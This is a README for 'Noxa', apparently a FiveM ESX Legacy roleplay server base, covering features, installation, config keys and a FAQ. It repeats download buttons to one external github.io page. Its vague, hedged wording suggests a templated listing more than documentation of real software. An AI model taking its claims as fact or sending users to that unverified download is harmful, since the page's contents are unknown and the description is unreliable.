# Noxa v - Game Script Utility 2026

> A FiveM ESX Legacy roleplay base built around essential server systems, UI-led administration, and update-ready resources for RP projects.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM%20ESX%20Legacy-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/daniel-adams1989/noxa-v-esx-legacy-script?style=flat-square)](https://github.com/daniel-adams1989/noxa-v-esx-legacy-script)

---

<p align="center">
  <a href="https://daniel-adams1989.github.io/noxa-v-esx-legacy-script/">
    <img src="https://img.shields.io/badge/Download-Noxa%20Script-brightgreen?style=for-the-badge" alt="Download Noxa Script">
  </a>
</p>

> **[Direct Download - Noxa](https://daniel-adams1989.github.io/noxa-v-esx-legacy-script/)**

---

[Download Latest Build](https://daniel-adams1989.github.io/noxa-v-esx-legacy-script/)

---

## Project Summary

Noxa is a FiveM roleplay foundation made for ESX Legacy servers. It combines the core pieces needed for a complete RP environment, with UI panels, staff utilities, vehicle handling, and progression-based gameplay loops all living in one base. Instead of assembling a server from many separate resources, this project is meant to serve as a unified starting point.

It also ships with a GitHub-connected update path, along with SQL migration handling and resource synchronization support. That helps keep the base aligned with new releases while preserving the expected structure of core modules like inventory, admin controls, anticheat UI, and economy-related content.

## Included Features

- Base RP framework tailored to ESX Legacy
- NUI panels for phone, inventory, management, and anticheat access
- Admin menu with reports, duty mode, and staff actions
- Vehicle flow covering dealership, garages, impound, and fuel persistence
- Drug gameplay loop with harvesting, processing, and selling
- GitHub-linked updater for release delivery and resource sync
- SQL migration support for database changes during updates
- Built for FiveM roleplay servers using oxmysql and UI-driven interaction

## Installation

1. Download the latest build from the release link above.
2. Place the resource folder in your server resources directory.
3. Import any included SQL migrations into your database.
4. Ensure required dependencies such as ESX Legacy and oxmysql are present.
5. Add the resource to your `server.cfg` and start it with the rest of your core resources.

Example:
    ensure noxa
    ensure oxmysql

If the project includes an update routine, follow the release notes before replacing files so your database and resources stay in sync.

## Configuration

Common settings usually cover core services, staff tooling, and UI behavior.

| Setting | Purpose |
| --- | --- |
| `AdminMenu` | Enables staff management features and report handling |
| `AnticheatUI` | Controls access to the anticheat interface |
| `InventoryNUI` | Switches the inventory interface behavior |
| `VehicleSystems` | Manages dealership, garage, and impound logic |
| `DrugProgression` | Enables harvesting, processing, and selling flows |
| `AutoUpdate` | Uses the GitHub-linked update process |

Example config:
    Config = {
      AutoUpdate = true,
      AdminMenu = true,
      VehicleSystems = true
    }

## Compatibility Notes

Noxa is intended for FiveM servers running ESX Legacy. It is built around NUI-based interaction and oxmysql-backed data handling, so those parts should be available in the destination setup.

Any limitations will depend on the surrounding server stack, installed dependencies, and custom edits made to the base. After updates, check SQL changes and resource order to avoid broken references or missing modules.

## FAQ

**How do I install it?**  
Download the resource, place it in your server files, apply the SQL changes, and add it to `server.cfg`.

**How do updates work?**  
The base includes a GitHub-linked updater path, so follow the provided release process when replacing files or syncing resources.

**Can I customize the UI and systems?**  
Yes. The project includes NUI panels and modular gameplay systems that can be adjusted to fit a specific RP server setup.

**Does it support ESX Legacy only?**  
The profile is centered on FiveM ESX Legacy, so that is the intended platform reference.

**Where do the database files go?**  
Import the SQL migrations into your server database before launching the resource.

**What should I check after updating?**  
Verify resource order, database changes, and any custom overrides you added to the base.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
